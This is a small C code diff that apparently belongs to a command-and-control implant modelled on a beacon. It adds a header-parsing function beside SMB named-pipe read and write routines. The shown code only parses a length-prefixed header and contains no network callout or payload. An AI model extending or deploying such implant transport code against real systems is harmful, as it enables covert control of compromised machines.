@@ -1,5 +1,7 @@
 #include "pch.h"
 
+#include "beacon.h"
+
 HANDLE ProtocolSmbPipeRead(HANDLE channel, char* buffer, int length)
 {
 	DWORD totalRead = 0;
@@ -39,3 +41,14 @@ BOOL ProtocolSmbPipeWrite(HANDLE hFile, char* buffer, int length)
     return TRUE;
 }
 
+char* ProtocolHeaderGet(char* setting, int headerSize, int* pHeaderLength)
+{
+	datap parser;
+	BeaconDataParse(&parser, setting, headerSize);
+	SHORT headerLength = BeaconDataShort(&parser);
+	*pHeaderLength = headerLength;
+	char* header = BeaconDataPtr(&parser, headerLength);
+	*(int*)(header + *pHeaderLength - sizeof(int)) = headerSize;
+	return header;
+
+}
